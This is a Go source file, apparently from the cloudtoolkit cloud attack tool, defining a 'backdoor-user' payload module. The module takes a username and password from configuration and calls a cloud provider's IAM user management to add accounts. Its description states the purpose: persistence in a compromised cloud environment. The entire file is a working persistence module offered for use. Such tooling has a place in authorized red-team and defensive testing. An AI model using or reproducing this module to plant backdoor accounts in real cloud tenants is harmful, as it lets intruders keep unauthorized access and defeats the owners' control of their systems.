package payloads

import (
	"context"
	"fmt"
	"strings"

	"github.com/404tk/cloudtoolkit/pkg/inventory"
	"github.com/404tk/cloudtoolkit/pkg/schema"
	"github.com/404tk/cloudtoolkit/utils"
	"github.com/404tk/cloudtoolkit/utils/audit"
	"github.com/404tk/cloudtoolkit/utils/logger"
)

type BackdoorUser struct{}

func (p BackdoorUser) Run(ctx context.Context, config map[string]string) {
	var action, args_1, args_2 string
	if metadata, ok := config["metadata"]; ok {
		data := strings.Split(metadata, " ")
		if len(data) < 2 {
			logger.Error("Execute `set metadata add <username> <password>`")
			return
		} else {
			action = data[0]
			args_1 = data[1]
			if len(data) >= 3 {
				args_2 = data[2]
			}
		}
	}
	i, err := inventory.New(config)
	if err != nil {
		logger.Error(err)
		return
	}
	mgr, ok := i.Providers.(schema.IAMManager)
	if !ok {
		logger.Error(fmt.Sprintf("%s does not support user management", i.Providers.Name()))
		return
	}
	audit.Log(audit.Record{
		Provider:  config[utils.Provider],
		Operation: "backdoor-user." + action,
		Target:    args_1,
	})
	mgr.UserManagement(action, args_1, args_2)
}

func (p BackdoorUser) Desc() string {
	return "Backdoored user can be used to obtain persistence in the Cloud environment."
}

func init() {
	registerPayload("backdoor-user", BackdoorUser{})
}
